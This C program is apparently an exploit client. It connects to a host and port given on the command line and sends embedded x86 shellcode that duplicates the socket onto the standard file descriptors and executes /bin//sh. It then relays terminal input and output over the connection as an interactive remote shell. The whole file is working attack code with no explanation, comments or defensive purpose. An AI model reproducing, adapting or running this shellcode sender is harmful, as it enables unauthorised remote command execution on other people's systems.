#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define ERROR (-1)

const char shellcode[] =
    "\x6a\x02\x5b\x6a\x29"
    "\x58\xcd\x80\x48\x31"
    "\xc9\x89\xc3\x6a\x3f"
    "\x58\xcd\x80\x41\x80"
    "\xf9\x03\x75\xf5\x31"
    "\xc0\x50\x68n/sh\x68"
    "//bi\x89\xe3\x50\x89"
    "\xe2\x53\x89\xe1\xb0"
    "\x0b\xcd\x80\x90\x90";

void error(const char * msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

int main(int argc, char * argv[])
{
    int client;
    char in[1024], out[1024];
    struct sockaddr_in addr;
    
    bzero(&addr, sizeof(addr));
    
    addr.sin_addr.s_addr = inet_addr(argv[1]);
    addr.sin_port        = htons(atoi(argv[2]));
    addr.sin_family      = AF_INET;
    
    client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    if (client == ERROR)
        error("socket");
	
	if (connect(client, (struct sockaddr *)&addr, sizeof(addr)) == ERROR)
		error("connect");
	
	if (send(client, shellcode, sizeof(shellcode), 0) == ERROR)
		error("send");
	
	printf("payload sent (%d).\n", sizeof (shellcode));
	
	while (read(STDIN_FILENO, in, sizeof (in))) {
        write(client, in, strlen(in));
        read(client, out, sizeof (out));
        write(STDOUT_FILENO, out, strlen(out));
    }
    
    close(client);
    
    return 0;
}
